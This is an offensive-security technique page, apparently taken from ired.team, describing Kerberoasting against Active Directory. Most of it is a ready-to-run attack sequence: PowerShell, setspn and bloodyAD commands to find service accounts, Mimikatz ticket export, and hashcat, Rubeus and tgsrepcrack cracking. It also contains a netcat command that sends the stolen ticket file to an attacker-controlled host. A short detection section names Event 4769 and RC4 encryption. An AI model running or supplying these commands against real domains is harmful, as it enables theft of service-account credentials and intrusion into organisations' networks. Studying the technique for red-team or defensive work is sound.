# Kerberoasting (T1558.003)

Source: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting

## Overview

Kerberoasting allows any domain user to request Kerberos TGS tickets encrypted with the NTLM hash of a service account's plaintext password. The tickets are cracked offline, avoiding AD lockout.

**Target**: User accounts with `servicePrincipalName` (SPN) attribute set.

## Execution

### Enumerate Users with SPNs
```powershell
# PowerView
Get-NetUser | Where-Object {$_.servicePrincipalName} | fl

# Native PowerShell
get-adobject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname -like "*CN=Users*" -and $_.cn -ne "krbtgt"}

# Windows built-in
setspn -T offense -Q */*
```

Linux (bloodyAD):
```bash
python bloodyAD.py -u '$user' -p '$password' -d '$domain' --host '$host' get search \
  --filter '(&(!(cn=krbtgt))(&(samAccountType=805306368)(servicePrincipalName=*)))' \
  --attr sAMAccountName
```

### Request TGS Ticket (Windows)
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/dc-mantvydas.offense.local"
```

### Export Ticket from Memory (Mimikatz)
```powershell
mimikatz # kerberos::list /export
```

### Send to Kali for Cracking
```bash
# On Kali
nc -lvp 443 > kerberoast.bin

# On victim
nc 10.0.0.5 443 < C:\tools\mimikatz\x64\2-40a10000-spotless@HTTP~dc-mantvydas.offense.local-OFFENSE.LOCAL.kirbi
```

### Crack (tgsrepcrack.py)
```bash
python2 tgsrepcrack.py pwd kerberoast.bin
```

### Or Use Rubeus (all-in-one)
```powershell
Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

### Crack with Hashcat
```bash
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
```

## Detection

- Security Event **4769** immediately after `Add-Type -AssemblyName System.IdentityModel`
- Encryption type **0x17** (RC4 / etype 23) in Event 4769 is suspicious
- Advanced PowerShell logging showing IdentityModel load

## Notes

- K0 = NTLM hash of password
- K1 = derived from K0 + message type  
- K2 = derived from K1 + MD5 of encrypted data → actual decryption key

## References
- Tim Medin - Attacking Kerberos: Kicking the Guard Dog of Hades
- https://github.com/nidem/kerberoast
- http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/
- MITRE ATT&CK T1558.003
